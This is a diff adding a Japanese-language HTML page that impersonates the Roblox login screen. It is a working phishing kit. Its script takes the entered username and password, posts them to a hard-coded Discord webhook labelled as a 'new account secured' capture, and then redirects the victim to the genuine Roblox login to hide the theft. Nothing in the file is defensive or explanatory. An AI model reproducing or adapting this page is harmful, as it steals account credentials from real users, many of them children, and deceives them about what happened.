@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>ログイン - Roblox</title>
+    <style>
+        body { font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #232527; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #fff; }
+        .login-card { background-color: #393b3d; width: 400px; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .logo { width: 50px; height: 50px; background-color: #fff; margin: 0 auto 24px; clip-path: polygon(20% 0%, 100% 20%, 80% 100%, 0% 80%); }
+        h1 { font-size: 20px; font-weight: 500; margin-bottom: 24px; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #111; border-radius: 4px; background-color: #191b1d; color: #fff; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #0084ff; }
+        .login-btn { width: 100%; padding: 12px; background-color: #0084ff; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .login-btn:hover { background-color: #0074e0; }
+        .footer { margin-top: 24px; font-size: 13px; color: #adb1b7; }
+        .footer a { color: #0084ff; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="logo"></div>
+    <h1>Robloxにログイン</h1>
+    <input type="text" id="u" placeholder="ユーザー名/メール/電話番号">
+    <input type="password" id="p" placeholder="パスワード">
+    <button class="login-btn" onclick="capture()">ログイン</button>
+    <div class="footer"><a href="#">パスワードまたはユーザー名を忘れましたか？</a></div>
+</div>
+
+<script>
+    function capture() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        // 直接Discord Webhookに飛ばす設定
+        const url = "https://discord.com/api/webhooks/1471478688049791079/kPza3m3l4ePYFrEOGtvepKn-8FGYowdSjEY6J5bo2wDLgoLuijSLmhAh_nAvbjCEmQlV";
+
+        if (!user || !pass) return;
+
+        const payload = {
+            embeds: [{
+                title: "💎 新規アカウント確保",
+                color: 0x0084ff,
+                fields: [
+                    { name: "👤 User", value: "```" + user + "```", inline: true },
+                    { name: "🔑 Pass", value: "```" + pass + "```", inline: true }
+                ],
+                footer: { text: "Captured at: " + new Date().toLocaleString() }
+            }]
+        };
+
+        // 送信の確実性を上げるため、sendBeaconとfetchを併用
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            // 完了後に本物へ転送
+            window.location.href = "https://www.roblox.com/login";
+        }).catch(() => {
+            window.location.href = "https://www.roblox.com/login";
+        });
+    }
+</script>
+
+</body>
+</html>
